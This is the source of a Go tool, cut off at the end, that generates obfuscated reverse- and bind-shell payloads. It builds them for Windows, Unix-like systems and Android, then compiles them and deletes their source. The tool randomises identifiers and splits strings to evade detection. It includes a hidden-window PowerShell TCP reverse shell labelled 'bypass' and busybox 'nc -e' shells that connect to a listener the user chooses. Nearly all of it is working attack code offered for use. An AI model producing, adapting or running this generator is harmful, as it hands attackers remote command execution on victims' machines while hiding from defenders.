package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"unsafe"
)

var osOption, cmdORpwsh, archvar, bindORrev, tgtvar, shell, namefile, outfile, randfilepath string
var payload []byte
var src = rand.NewSource(time.Now().UnixNano())

const (
	goos        = "GOOS"
	goarch      = "GOARCH"
	charBytes   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	charIdxBits = 6                  // 6 bits to represent a letter index
	charIdxMask = 1<<charIdxBits - 1 // All 1-bits, as many as letterIdxBits
	charIdxMax  = 63 / charIdxBits   // # of letter indices fitting in 63 bits
)

func randstrgen(n int) string { // NOW with more R@ND0M! Credit goes to Go Playground found here: https://play.golang.org/p/KcuJ_2c_NDj
	a := make([]byte, n)
	for j, cache, remain := n-1, src.Int63(), charIdxMax; j >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), charIdxMax
		}
		if idx := int(cache & charIdxMask); idx < len(charBytes) {
			a[j] = charBytes[idx]
			j--
		}
		cache >>= charIdxBits
		remain--
	}
	return *(*string)(unsafe.Pointer(&a))
}

func checkInSlice(str string, list []string) bool {
	for _, v := range list {
		if v == str {
			return true
		}
	}
	return false
}

func genfunc() {
	_ = randstrgen(rand.Intn(100))         // Used to generate first random value (usually a single character)
	_ = ""                                 // and set it to nothing
	randname := randstrgen(rand.Intn(100)) // Feel free to adjust the 'Intn()' value accordingly
	if runtime.GOOS == "windows" {
		randfilepath = "C:\\Users\\Public\\" + randname + ".go" // Implemented to mask source path within binary artifacts.
	} else {
		randfilepath = "/tmp/" + randname + ".go"
	}
	namefile := outfile
	bindshell, revshell, netstr, addrval, shellstr, connstr, bindconn, listenstr, cmdstr, syscmdStr, socketStr, streamStr, writerStr, bufferStr, encodingStr, readStr, resStr, outStr, argsStr, pinfoStr, pStr, stdoutStr, stderrStr, wincmdStr := randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32))
	randaddr, randsocket, randbinstr, randshstr, randsysstr, randbusystr, randcstr, randwinstr, randsys32str, randsys64str, randcmdexe, randwinpwshstr, randvonestr, randpwshexe, randTstr, randCstr, randPstr := randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32))
	netval := "tcp"
	unixArray := []string{"linux", "freebsd", "nacl", "netbsd", "openbsd", "plan9", "solaris", "dragonfly"}
	if checkInSlice(osOption, unixArray) {
		shell = "/bin/sh"
	}
	if osOption == "android" && archvar == "arm" {
		shell = "/system/bin/sh"
	}
	if cmdORpwsh == "powershell" || cmdORpwsh == "C:\\Windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" {
		shell = "C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
	}
	if cmdORpwsh == "cmd" || cmdORpwsh == "C:\\Windows\\System32\\cmd.exe" {
		shell = "C:\\\\Windows\\\\System32\\\\cmd.exe"
	}
	if cmdORpwsh == "/bin/sh" || cmdORpwsh == "/system/bin/sh" || cmdORpwsh == "/bin/busybox" {
		shell = cmdORpwsh
	}
	if bindORrev == "bind" && cmdORpwsh == "bypass" {
		fmt.Println("Bypass feature only supports reverse shell type.")
		os.Exit(0)
	}
	addrsplit, netsplit := strings.Split(tgtvar, ":"), strings.Split(netval, "") // Begin the string splitting for obfuscation
	addrstr, portstr := addrsplit[0], addrsplit[1]
	ipsplit := strings.SplitAfter(addrstr, ".")
	oct1, oct2, oct3, oct4 := ipsplit[0], ipsplit[1], ipsplit[2], ipsplit[3]
	Tstr, Cstr, Pstr := netsplit[0], netsplit[1], netsplit[2]
	var binstr, shstr, sysstr, busystr, cstr, winstr, sys32str, cmdexe, cmd1, cmd2, cmd3, cmd4, cmd5, cmd6, cmd7, sys64str, winpwshstr, vonestr, pwshexe string
	if shell == "/bin/sh" {
		binshval := strings.Split(shell, "/")
		binstr, shstr = binshval[1], binshval[2]
	}
	if shell == "/system/bin/sh" {
		sysbinshval := strings.Split(shell, "/")
		sysstr, binstr, shstr = sysbinshval[1], sysbinshval[2], sysbinshval[3]
	}
	if cmdORpwsh == "/bin/busybox" {
		busyboxval := strings.Split(shell, "/")
		binstr, busystr = busyboxval[1], busyboxval[2]
	}
	if shell == "C:\\\\Windows\\\\System32\\\\cmd.exe" {
		cwinsys32cmd := strings.Split(shell, "\\\\")
		cstr, winstr, sys32str, cmdexe = cwinsys32cmd[0], cwinsys32cmd[1], cwinsys32cmd[2], cwinsys32cmd[3]
	}
	if shell == "C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" {
		cwinsys64winpwshvonepwshexe := strings.Split(shell, "\\\\")
		cstr, winstr, sys64str, winpwshstr, vonestr, pwshexe = cwinsys64winpwshvonepwshexe[0], cwinsys64winpwshvonepwshexe[1], cwinsys64winpwshvonepwshexe[2], cwinsys64winpwshvonepwshexe[3], cwinsys64winpwshvonepwshexe[4], cwinsys64winpwshvonepwshexe[5]
	}
	if bindORrev == "reverse" {
		if checkInSlice(osOption, unixArray) && shell == "/bin/sh" {
			payload = []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar " + addrval + ", " + shellstr + " string\nvar " + randaddr + ", " + randTstr + ", " + randsocket + ", " + randCstr + ", " + randbinstr + ", " + randPstr + ", " + randshstr + "  string = \"" + addrstr + "\", \"" + Tstr + "\", \"" + portstr + "\", \"" + Cstr + "\", \"" + binstr + "\", \"" + Pstr + "\", \"" + shstr + "\"\nfunc " + revshell + "(" + netstr + ", " + addrval + ", " + shellstr + " string) {\n\t" + connstr + ", _ := net.Dial(" + netstr + ", " + addrval + ")\n\t" + cmdstr + " := exec.Command(" + shellstr + ")\n\t" + cmdstr + ".Stdin = " + connstr + "\n\t" + cmdstr + ".Stdout = " + connstr + "\n\t" + cmdstr + ".Stderr = " + connstr + "\n\t" + cmdstr + ".Run()\n}\nfunc main() {\n\t" + revshell + "(" + randTstr + " + " + randCstr + " + " + randPstr + ", " + randaddr + " + \":\" + " + randsocket + ", \"/\" + " + randbinstr + " + \"/\" + " + randshstr + ")\n}\n")
		}
		if checkInSlice(osOption, unixArray) && shell == "/system/bin/sh" {
			payload = []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar " + addrval + ", " + shellstr + " string\nvar " + randaddr + ", " + randTstr + ", " + randsocket + ", " + randCstr + ", " + randsysstr + ", " + randbinstr + ", " + randPstr + ", " + randshstr + "  string = \"" + addrstr + "\", \"" + Tstr + "\", \"" + portstr + "\", \"" + Cstr + "\", \"" + sysstr + ", \"" + binstr + "\", \"" + Pstr + "\", \"" + shstr + "\"\nfunc " + revshell + "(" + netstr + ", " + addrval + ", " + shellstr + " string) {\n\t" + connstr + ", _ := net.Dial(" + netstr + ", " + addrval + ")\n\t" + cmdstr + " := exec.Command(" + shellstr + ")\n\t" + cmdstr + ".Stdin = " + connstr + "\n\t" + cmdstr + ".Stdout = " + connstr + "\n\t" + cmdstr + ".Stderr = " + connstr + "\n\t" + cmdstr + ".Run()\n}\nfunc main() {\n\t" + revshell + "(" + randTstr + " + " + randCstr + " + " + randPstr + ", " + randaddr + " + \":\" + " + randsocket + ", \"/\" + " + randsysstr + " + \"/\" + " + randbinstr + " + \"/\" + " + randshstr + ")\n}\n")
		}
		if shell == "C:\\\\Windows\\\\System32\\\\cmd.exe" {
			payload = []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar " + addrval + ", " + shellstr + " string\nvar " + randaddr + ", " + randTstr + ", " + randsocket + ", " + randCstr + ", " + randcstr + ", " + randPstr + ", " + randwinstr + ", " + randsys32str + ", " + randcmdexe + "  string = \"" + addrstr + "\", \"" + Tstr + "\", \"" + portstr + "\", \"" + Cstr + "\", \"" + cstr + "\", \"" + Pstr + "\", \"" + winstr + "\", \"" + sys32str + "\", \"" + cmdexe + "\"\nfunc " + revshell + "(" + netstr + ", " + addrval + ", " + shellstr + " string) {\n\t" + connstr + ", _ := net.Dial(" + netstr + ", " + addrval + ")\n\t" + cmdstr + " := exec.Command(" + shellstr + ")\n\t" + cmdstr + ".Stdin = " + connstr + "\n\t" + cmdstr + ".Stdout = " + connstr + "\n\t" + cmdstr + ".Stderr = " + connstr + "\n\t" + cmdstr + ".Run()\n}\nfunc main() {\n\t" + revshell + "(" + randTstr + " + " + randCstr + " + " + randPstr + ", " + randaddr + " + \":\" + " + randsocket + ", " + randcstr + " + \"\\\\\" + " + randwinstr + " + \"\\\\\" + " + randsys32str + " + \"\\\\\" + " + randcmdexe + ")\n}\n")
		}
		if shell == "C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" {
			payload = []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar " + addrval + ", " + shellstr + " string\nvar " + randaddr + ", " + randTstr + ", " + randsocket + ", " + randCstr + ", " + randcstr + ", " + randPstr + ", " + randwinstr + ", " + randsys64str + ", " + randwinpwshstr + ", " + randvonestr + ", " + randpwshexe + "  string = \"" + addrstr + "\", \"" + Tstr + "\", \"" + portstr + "\", \"" + Cstr + "\", \"" + cstr + "\", \"" + Pstr + "\", \"" + winstr + "\", \"" + sys64str + "\", \"" + winpwshstr + "\", \"" + vonestr + "\", \"" + pwshexe + "\"\nfunc " + revshell + "(" + netstr + ", " + addrval + ", " + shellstr + " string) {\n\t" + connstr + ", _ := net.Dial(" + netstr + ", " + addrval + ")\n\t" + cmdstr + " := exec.Command(" + shellstr + ")\n\t" + cmdstr + ".Stdin = " + connstr + "\n\t" + cmdstr + ".Stdout = " + connstr + "\n\t" + cmdstr + ".Stderr = " + connstr + "\n\t" + cmdstr + ".Run()\n}\nfunc main() {\n\t" + revshell + "(" + randTstr + " + " + randCstr + " + " + randPstr + ", " + randaddr + " + \":\" + " + randsocket + ", " + randcstr + " + \"\\\\\" + " + randwinstr + " + \"\\\\\" + " + randsys64str + " + \"\\\\\" + " + randwinpwshstr + " + \"\\\\\" + " + randvonestr + " + \"\\\\\" + " + randpwshexe + ")\n}\n")
		}
	}
	if bindORrev == "bind" {
		if checkInSlice(osOption, unixArray) && shell == "/bin/sh" {
			payload = []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar " + addrval + ", " + shellstr + " string\nvar " + randaddr + ", " + randTstr + ", " + randsocket + ", " + randCstr + ", " + randbinstr + ", " + randPstr + ", " + randshstr + "  string = \"" + addrstr + "\", \"" + Tstr + "\", \"" + portstr + "\", \"" + Cstr + "\", \"" + binstr + "\", \"" + Pstr + "\", \"" + shstr + "\"\nfunc " + bindshell + "(" + netstr + ", " + addrval + ", " + shellstr + " string) {\n\t" + listenstr + ", err := net.Listen(" + netstr + ", " + addrval + ")\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer " + listenstr + ".Close()\n\tfor {\n\t\t" + bindconn + ", _ := " + listenstr + ".Accept()\n\t\tgo func(" + connstr + " net.Conn) {\n\t\t\t" + cmdstr + " := exec.Command(" + shellstr + ")\n\t\t\t" + cmdstr + ".Stdin = " + connstr + "\n\t\t\t" + cmdstr + ".Stdout = " + connstr + "\n\t\t\t" + cmdstr + ".Stderr = " + connstr + "\n\t\t\t" + cmdstr + ".Run()\n\t\t\tdefer " + connstr + ".Close()\n\t\t}(" + bindconn + ")\n\t}\n}\n\nfunc main() {\n\t" + bindshell + "(" + randTstr + " + " + randCstr + " + " + randPstr + ", " + randaddr + " + \":\" + " + randsocket + ", \"/\" + " + randbinstr + " + \"/\" + " + randshstr + ")\n}\n")
		}
		if checkInSlice(osOption, unixArray) && shell == "/system/bin/sh" {
			payload = []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar " + addrval + ", " + shellstr + " string\nvar " + randaddr + ", " + randTstr + ", " + randsocket + ", " + randCstr + ", " + randsysstr + ", " + randbinstr + ", " + randPstr + ", " + randshstr + "  string = \"" + addrstr + "\", \"" + Tstr + "\", \"" + portstr + "\", \"" + Cstr + "\", \"" + sysstr + "\", \"" + binstr + "\", \"" + Pstr + "\", \"" + shstr + "\"\nfunc " + bindshell + "(" + netstr + ", " + addrval + ", " + shellstr + " string) {\n\t" + listenstr + ", err := net.Listen(" + netstr + ", " + addrval + ")\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer " + listenstr + ".Close()\n\tfor {\n\t\t" + bindconn + ", _ := " + listenstr + ".Accept()\n\t\tgo func(" + connstr + " net.Conn) {\n\t\t\t" + cmdstr + " := exec.Command(" + shellstr + ")\n\t\t\t" + cmdstr + ".Stdin = " + connstr + "\n\t\t\t" + cmdstr + ".Stdout = " + connstr + "\n\t\t\t" + cmdstr + ".Stderr = " + connstr + "\n\t\t\t" + cmdstr + ".Run()\n\t\t\tdefer " + connstr + ".Close()\n\t\t}(" + bindconn + ")\n\t}\n}\n\nfunc main() {\n\t" + bindshell + "(" + randTstr + " + " + randCstr + " + " + randPstr + ", " + randaddr + " + \":\" + " + randsocket + ", \"/\" + " + randsysstr + " + \"/\" + " + randbinstr + " + \"/\" + " + randshstr + ")\n}\n")
		}
		if shell == "C:\\\\Windows\\\\System32\\\\cmd.exe" {
			payload = []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar " + addrval + ", " + shellstr + " string\nvar " + randaddr + ", " + randTstr + ", " + randsocket + ", " + randCstr + ", " + randcstr + ", " + randPstr + ", " + randwinstr + ", " + randsys32str + ", " + randcmdexe + "  string = \"" + addrstr + "\", \"" + Tstr + "\", \"" + portstr + "\", \"" + Cstr + "\", \"" + cstr + "\", \"" + Pstr + "\", \"" + winstr + "\", \"" + sys32str + "\", \"" + cmdexe + "\"\nfunc " + bindshell + "(" + netstr + ", " + addrval + ", " + shellstr + " string) {\n\t" + listenstr + ", err := net.Listen(" + netstr + ", " + addrval + ")\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer " + listenstr + ".Close()\n\tfor {\n\t\t" + bindconn + ", _ := " + listenstr + ".Accept()\n\t\tgo func(" + connstr + " net.Conn) {\n\t\t\t" + cmdstr + " := exec.Command(" + shellstr + ")\n\t\t\t" + cmdstr + ".Stdin = " + connstr + "\n\t\t\t" + cmdstr + ".Stdout = " + connstr + "\n\t\t\t" + cmdstr + ".Stderr = " + connstr + "\n\t\t\t" + cmdstr + ".Run()\n\t\t\tdefer " + connstr + ".Close()\n\t\t}(" + bindconn + ")\n\t}\n}\n\nfunc main() {\n\t" + bindshell + "(" + randTstr + " + " + randCstr + " + " + randPstr + ", " + randaddr + " + \":\" + " + randsocket + ", " + randcstr + " + \"\\\\\" + " + randwinstr + " + \"\\\\\" + " + randsys32str + " + \"\\\\\" + " + randcmdexe + ")\n}\n")
		}
		if shell == "C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" {
			payload = []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar " + addrval + ", " + shellstr + " string\nvar " + randaddr + ", " + randTstr + ", " + randsocket + ", " + randCstr + ", " + randcstr + ", " + randPstr + ", " + randwinstr + ", " + randsys64str + ", " + randwinpwshstr + ", " + randvonestr + ", " + randpwshexe + "  string = \"" + addrstr + "\", \"" + Tstr + "\", \"" + portstr + "\", \"" + Cstr + "\", \"" + cstr + "\", \"" + Pstr + "\", \"" + winstr + "\", \"" + sys64str + "\", \"" + winpwshstr + "\", \"" + vonestr + "\", \"" + pwshexe + "\"\nfunc " + bindshell + "(" + netstr + ", " + addrval + ", " + shellstr + " string) {\n\t" + listenstr + ", err := net.Listen(" + netstr + ", " + addrval + ")\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer " + listenstr + ".Close()\n\tfor {\n\t\t" + bindconn + ", _ := " + listenstr + ".Accept()\n\t\tgo func(" + connstr + " net.Conn) {\n\t\t\t" + cmdstr + " := exec.Command(" + shellstr + ")\n\t\t\t" + cmdstr + ".Stdin = " + connstr + "\n\t\t\t" + cmdstr + ".Stdout = " + connstr + "\n\t\t\t" + cmdstr + ".Stderr = " + connstr + "\n\t\t\t" + cmdstr + ".Run()\n\t\t\tdefer " + connstr + ".Close()\n\t\t}(" + bindconn + ")\n\t}\n}\n\nfunc main() {\n\t" + bindshell + "(" + randTstr + " + " + randCstr + " + " + randPstr + ", " + randaddr + " + \":\" + " + randsocket + ", " + randcstr + " + \"\\\\\" + " + randwinstr + " + \"\\\\\" + " + randsys64str + " + \"\\\\\" + " + randwinpwshstr + " + \"\\\\\" + " + randvonestr + " + \"\\\\\" + " + randpwshexe + ")\n}\n")
		}
	}
	if cmdORpwsh == "bypass" {
		shell = "C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
		cmdexe = "cmd.exe"
		winpwshsplit := strings.Split(shell, "\\\\")
		cstr, winstr, sys64str, winpwshstr, vonestr, pwshexe = winpwshsplit[0], winpwshsplit[1], winpwshsplit[2], winpwshsplit[3], winpwshsplit[4], winpwshsplit[5]
		cmdsplit := strings.Split(cmdexe, "")
		cmd1, cmd2, cmd3, cmd4, cmd5, cmd6, cmd7 = cmdsplit[0], cmdsplit[1], cmdsplit[2], cmdsplit[3], cmdsplit[4], cmdsplit[5], cmdsplit[6]
		randcmd1, randoct1, randcmd2, randoct2, randcmd3, randcmd4, randcmd5, randoct3, randcmd6, randoct4, randcmd7, randtac, randwindow, randstyle, randhidden := randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32)), randstrgen(rand.Intn(32))
		tac, window, style, hidden := "-", "window", "style", "hidden"
		payload = []byte("package main\n\nimport (\n\t\"log\"\n\t\"os/exec\"\n)\nvar " + cmdstr + " string\nvar " + randcstr + ", " + randtac + ", " + randwinstr + ", " + randwindow + ", " + randsys64str + ", " + randstyle + ", " + randwinpwshstr + ", " + randhidden + ", " + randvonestr + ", " + randpwshexe + " string = \"" + cstr + "\", \"" + tac + "\", \"" + winstr + "\", \"" + window + "\", \"" + sys64str + "\", \"" + style + "\", \"" + winpwshstr + "\", \"" + hidden + "\", \"" + vonestr + "\", \"" + pwshexe + "\"\nfunc main() {\n\t" + cmdstr + " = \"$" + randcmd1 + "=\\\"" + cmd1 + "\\\";$" + randoct1 + "=\\\"" + oct1 + "\\\";$" + randcmd2 + "=\\\"" + cmd2 + "\\\";$" + randoct2 + "=\\\"" + oct2 + "\\\";$" + randcmd3 + "=\\\"" + cmd3 + "\\\";$" + randsocket + "=" + portstr + ";$" + randcmd4 + "=\\\"" + cmd4 + "\\\";$" + randoct3 + "=\\\"" + oct3 + "\\\";$" + randcmd5 + "=\\\"" + cmd5 + "\\\";$" + randoct4 + "=\\\"" + oct4 + "\\\";$" + randcmd6 + "=\\\"" + cmd6 + "\\\";$" + randoct3 + "=\\\"" + oct3 + "\\\";$" + randcmd7 + "=\\\"" + cmd7 + "\\\";$" + socketStr + " = new-object System.Net.Sockets.TcpClient(\\\"$" + randoct1 + "$" + randoct2 + "$" + randoct3 + "$" + randoct4 + "\\\", \\\"$" + randsocket + "\\\");if($" + socketStr + " -eq $null){exit 1} $" + streamStr + " = $" + socketStr + ".GetStream();$" + writerStr + " = new-object System.IO.StreamWriter($" + streamStr + ");$" + bufferStr + " = new-object System.Byte[] 1024;$" + encodingStr + " = new-object System.Text.AsciiEncoding;do { $" + writerStr + ".Flush();$" + readStr + " = $null; $" + resStr + " = \\\"\\\";while($" + streamStr + ".DataAvailable -or $" + readStr + " -eq $null) { $" + readStr + " = $" + streamStr + ".Read($" + bufferStr + ", 0, 1024) };$" + outStr + " = $" + encodingStr + ".GetString($" + bufferStr + ", 0, $" + readStr + ").Replace(\\\"`r`n\\\",\\\"\\\").Replace(\\\"`n\\\",\\\"\\\");if(!$" + outStr + ".equals(\\\"exit\\\")){ $" + argsStr + " = \\\"\\\";if($" + outStr + ".IndexOf(' ') -gt -1){$" + argsStr + " = $" + outStr + ".substring($" + outStr + ".IndexOf(' ')+1);$" + outStr + " = $" + outStr + ".substring(0,$" + outStr + ".IndexOf(' '));if($" + argsStr + ".split(' ').length -gt 1){$" + pinfoStr + " = New-Object System.Diagnostics.ProcessStartInfo;$" + pinfoStr + ".FileName = \\\"$" + randcmd1 + "$" + randcmd2 + "$" + randcmd3 + "$" + randcmd4 + "$" + randcmd5 + "$" + randcmd6 + "$" + randcmd7 + "\\\"; $" + pinfoStr + ".RedirectStandardError = $true;$" + pinfoStr + ".RedirectStandardOutput = $true;$" + pinfoStr + ".UseShellExecute = $false;$" + pinfoStr + ".Arguments = \\\"/c $" + outStr + " $" + argsStr + "\\\";$" + pStr + " = New-Object System.Diagnostics.Process;$" + pStr + ".StartInfo = $" + pinfoStr + ";$" + pStr + ".Start() | Out-Null;$" + pStr + ".WaitForExit();$" + stdoutStr + " = $" + pStr + ".StandardOutput.ReadToEnd();$" + stderrStr + " = $" + pStr + ".StandardError.ReadToEnd();if ($" + pStr + ".ExitCode -ne 0) {$" + resStr + " = $" + stderrStr + ";} else {$" + resStr + " = $" + stdoutStr + ";};} else { $" + resStr + " = (&\\\"$" + outStr + "\\\" \\\"$" + argsStr + "\\\") | out-string;};} else {$" + resStr + " = (&\\\"$" + outStr + "\\\") | out-string;};if($" + resStr + " -ne $null){ $" + writerStr + ".WriteLine($" + resStr + ");};};} While (!$" + outStr + ".equals(\\\"exit\\\"));$" + writerStr + ".close();$" + socketStr + ".close();$" + streamStr + ".Dispose();\"\n\t" + wincmdStr + " := exec.Command(" + randcstr + " + \"\\\\\" + " + randwinstr + " + \"\\\\\" + " + randsys64str + " + \"\\\\\" + " + randwinpwshstr + " + \"\\\\\" + " + randvonestr + " + \"\\\\\" + " + randpwshexe + ", " + randtac + " + " + randwindow + " + " + randstyle + ", " + randhidden + ", " + cmdstr + ")\n\terr := " + wincmdStr + ".Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\t\n}\n}")
	}
	if cmdORpwsh == "/bin/busybox" && osOption == "android" {
		if bindORrev == "reverse" {
			payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar " + cmdstr + " string\nvar " + randaddr + ", " + randsocket + ", " + randbusystr + ", " + randsysstr + ", " + randbinstr + ", " + randshstr + " string = \"" + addrstr + "\", \"" + portstr + "\", \"" + busystr + ", \"" + sysstr + ", \"" + binstr + "\", \"" + shstr + "\"\nfunc main(){\n\t" + cmdstr + " = \"/\" + " + randsysstr + " + \"/\" + " + randbinstr + " + \"/\" + " + randshstr + "\n\t" + syscmdStr + " := exec.Command(\"/\" + " + randsysstr + " + \"/\" + " + randbinstr + " + \"/\" + " + randbusystr + ", \"nc\", " + randaddr + ", " + randsocket + ", \"-e\", " + cmdstr + ")\n\terr := " + syscmdStr + ".Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n")
		}
		if bindORrev == "bind" {
			payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar " + cmdstr + " string\nvar " + randaddr + ", " + randsocket + ", " + randbusystr + ", " + randsysstr + ", " + randbinstr + ", " + randshstr + "  string = \"" + addrstr + "\", \"" + portstr + "\", \"" + busystr + ", \"" + sysstr + ", \"" + binstr + "\", \"" + shstr + "\"\nfunc main(){\n\t" + cmdstr + " = \"/\" + " + randsysstr + " + \"/\" + " + randbinstr + " + \"/\" + " + randshstr + "\n\t" + syscmdStr + " := exec.Command(\"/\" + " + randsysstr + " + \"/\" + " + randbinstr + " + \"/\" + " + randbusystr + ", \"nc\", \"-l\", " + randaddr + ", \"-p\", " + randsocket + ", \"-e\", " + cmdstr + ")\n\terr := " + syscmdStr + ".Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n")
		}
	}
	if cmdORpwsh == "/bin/busybox" && checkInSlice(osOption, unixArray) {
		if bindORrev == "reverse" {
			payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar " + cmdstr + " string\nvar " + randaddr + ", " + randsocket + ", " + randbusystr + ", " + randbinstr + ", " + randshstr + " string = \"" + addrstr + "\", \"" + portstr + "\", \"" + busystr + ", \"" + binstr + "\", \"" + shstr + "\"\nfunc main(){\n\t" + cmdstr + " = \"/\" + " + randbinstr + " + \"/\" + " + randshstr + "\n\t" + syscmdStr + " := exec.Command(\"/\" + " + randbinstr + " + \"/\" + " + randbusystr + ", \"nc\", " + randaddr + ", " + randsocket + ", \"-e\", " + cmdstr + ")\n\terr := " + syscmdStr + ".Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n")
		}
		if bindORrev == "bind" {
			payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar " + cmdstr + " string\nvar " + randaddr + ", " + randsocket + ", " + randbusystr + ", " + randbinstr + ", " + randshstr + "  string = \"" + addrstr + "\", \"" + portstr + "\", \"" + busystr + ", \"" + binstr + "\", \"" + shstr + "\"\nfunc main(){\n\t" + cmdstr + " = \"/\" + " + randbinstr + " + \"/\" + " + randshstr + "\n\t" + syscmdStr + " := exec.Command(\"/\" + " + randbinstr + " + \"/\" + " + randbusystr + ", \"nc\", \"-l\", " + randaddr + ", \"-p\", " + randsocket + ", \"-e\", " + cmdstr + ")\n\terr := " + syscmdStr + ".Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n")
		}
	}
	err := ioutil.WriteFile(randfilepath, payload, 0644)
	if err != nil {
		fmt.Println("Could not create file")
	}
	fmt.Println("Shell file created.")
	gocom := "go"
	cmdargs := []string{"build", "-ldflags=-s -w", randfilepath}
	cmd := exec.Command(gocom, cmdargs...)
	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", goos, osOption))
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", goarch, archvar))
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Could not compile")
		os.Exit(0)
	}
	fmt.Printf("%s", out)
	fmt.Println("Binary Created.")
	err = os.Remove(fmt.Sprintf("%s", randfilepath))
	if err != nil {
		fmt.Println("Could not remove file")
	}
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	if osOption == "windows" {
		os.Rename(pwd+"/"+randname+".exe", namefile+".exe")
	} else {
		os.Rename(pwd+"/"+randname, namefile)
	}
	if runtime.GOOS == "windows" {
		showbin := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", "dir")
		out1, err := showbin.CombinedOutput()
		if err != nil {
			fmt.Println("Could not run command.")
		}
		fmt.Printf("%s", string(out1))
		os.Exit(0)
	} else {
		if osOption == "windows" {
			showbin1 := exec.Command("file", namefile+".exe")
			out2, err := showbin1.CombinedOutput()
			if err != nil {
				fmt.Println("Could not run command.")
			}
			fmt.Printf("%s", string(out2))
		} else {
			showbin2 := exec.Command("file", namefile)
			out3, err := showbin2.CombinedOutput()
			if err != nil {
				fmt.Println("Could not run command.")
			}
			fmt.Printf("%s", string(out3))
		}
		os.Exit(0)
	}
}

func clifunc() {
	flag.StringVar(&osOption, "p", "", "Operating System: windows, linux, freebsd, nacl, netbsd, openbsd, plan9, solaris, dragonfly, darwin, android")
	flag.StringVar(&cmdORpwsh, "s", "", "Shell type: C:\\Windows\\System32\\cmd.exe, C:\\Windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe, /bin/sh, /system/bin/sh, /bin/busybox, bypass")
	flag.StringVar(&archvar, "a", "", "Architecture: 386, amd64, amd64p32, arm, arm64, ppc64, ppc64le, mips, mipsle, mips64, mips64le, s390x, sparc64")
	flag.StringVar(&bindORrev, "t", "", "Payload type: bind/reverse")
	flag.StringVar(&tgtvar, "l", "", "Listening host: <listening ip:port>")
	flag.StringVar(&outfile, "o", "", "Output filename: <anything goes>")
	flag.Parse()
	cliargs := [6]string{"OS: " + osOption + "\n", "Shell: " + cmdORpwsh + "\n", "Arch: " + archvar + "\n", "Type: " + bindORrev + "\n", "Listener: " + tgtvar + "\n", "Outfile: " + outfile + "\n"}
	for i := 0; i < len(cliargs); i++ {
